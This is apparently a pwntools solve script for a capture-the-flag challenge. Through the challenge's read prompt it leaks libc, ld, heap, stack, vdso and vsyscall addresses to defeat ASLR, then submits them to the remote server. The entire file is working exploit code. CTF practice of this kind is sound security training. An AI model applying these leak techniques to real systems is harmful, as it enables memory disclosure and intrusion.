#!/usr/bin/env python3

from pwn import *

exe = './chall_patched'
libc_path = './libc.so.6'
ld_path = './ld-2.35.so'

elf = context.binary = ELF(exe, checksec=True)
libc = ELF(libc_path, checksec=False)
ld = ELF(ld_path, checksec=False)

host = 'challs.pwnoh.io'
port = 13375
r = remote(host, port, level='DEBUG')
## r = process(exe, level='DEBUG')

gs = ''' 

''' 

context.log_level = 'debug'

## r = gdb.debug(exe, gdbscript=gs)

puts_got = elf.got['puts']
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(puts_got).encode())
puts_leak = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
libc.address = puts_leak - libc.sym['puts']

elf_base = 0x400000
libc_base = libc.address

print(f"libc_base = {libc_base} => in hex: {hex(libc_base)}")

ld_pos = 0x404010
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(ld_pos).encode())
ld_base = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
ld_base = ld_base - (0x7f4ca5623d30 - 0x7f4ca560e000)

print(f"ld_base = {ld_base} => in hex: {hex(ld_base)}")

arena_top = libc_base + (0x7f30c7285ce0 - 0x7f30c706b000)
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(arena_top).encode())
heap_base = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
heap_base = heap_base - 0x3a0

vdso_pos = (0x7f4ca5649890 - 0x7f4ca560e000) + ld_base
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(vdso_pos).encode())
vdso_leak = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
vvar_leak = vdso_leak - 0x4000

stack_pos = libc.sym['environ']
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(stack_pos).encode())
stack_leak = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)

print(hex(stack_leak))
stack_leak = (stack_leak & 0xfff) ^ stack_leak + 0x2000 - 0x21000
print(hex(stack_leak))

vsyscall = 0xffffffffff600000

r.recvuntil(b'Where to, captain?\n')
r.sendline(str(0).encode())

r.recvuntil(b'?\n')
r.sendline(str(elf_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(heap_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(libc_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(ld_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(stack_leak).encode())

r.recvuntil(b'?\n')
r.sendline(str(vvar_leak).encode())

r.recvuntil(b'?\n')
r.sendline(str(vdso_leak).encode())

r.recvuntil(b'?\n')
r.sendline(str(vsyscall).encode())

r.interactive()
